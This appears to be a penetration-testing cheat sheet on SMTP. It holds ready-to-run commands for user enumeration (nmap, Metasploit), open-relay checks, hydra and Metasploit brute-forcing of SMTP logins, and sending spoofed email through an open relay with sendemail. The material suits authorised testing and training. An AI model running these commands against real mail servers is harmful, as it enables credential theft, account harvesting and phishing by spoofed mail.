```table-of-contents
```

**Simple Mail Transfer Protocol (SMTP)** is used for sending emails between mail servers. Running on **TCP port 25 (plaintext)**, **port 465 (SMTPS - SSL encrypted)**, and **port 587 (STARTTLS encrypted)**, SMTP can be vulnerable to **user enumeration, open relay abuse, credential brute-forcing, and sensitive data leakage**.

## Common Attack Vectors

- **User Enumeration:** Some SMTP servers respond differently when verifying valid and invalid users.
- **Open Mail Relays:** Misconfigured servers allow sending emails without authentication (useful for spamming and phishing).
- **Weak Authentication:** Some servers use **plaintext authentication**, making them vulnerable to brute-force attacks.
- **Exposed Email Data:** SMTP servers often leak internal email addresses, system information, and headers.
## Enumeration
### Banner Grabbing
```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay <target-ip>
```

```bash
nc -nv <target-ip> <25,587>
```

Cross reference the version for vulnerabilities in exploit-DB.

## Enumerate SMTP Users
```bash
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} <target-ip>
```

- **VRFY**: Verify if a user exists.
- **EXPN**: Expand mailing lists, potentially revealing email addresses.

Metasploit:
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target-ip>
run
```

## Open Relaying (Unauthenticated Email Sending)
```bash
nmap --script smtp-open-relay -p 25,465,587 <target-ip>
```

## Brute-Force SMTP Authentication
```bash
hydra -L users.txt -P passwords.txt -s 25 <target-ip> smtp
```

Metasploit:
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## SMTP Open Relay
An **Open Relay** allows sending email from any domain without authentication. Attackers commonly exploit this to send spam, phishing emails, or spoof messages.
```bash
nmap -p25 --script smtp-open-relay <target-ip>
```

## Exploiting Misconfigurations
If you confirm an open relay exists, you can send spoofed emails using command-line tools:
Using `sendemail`:
```bash
sendemail -f spoofed@example.com -t victim@target.com -s <target-ip>:25 -u "Subject Here" -m "Your message here."
```

- `-f`: Sender email address (spoofed).
- `-t`: Recipient.
- `-s`: SMTP server IP and port.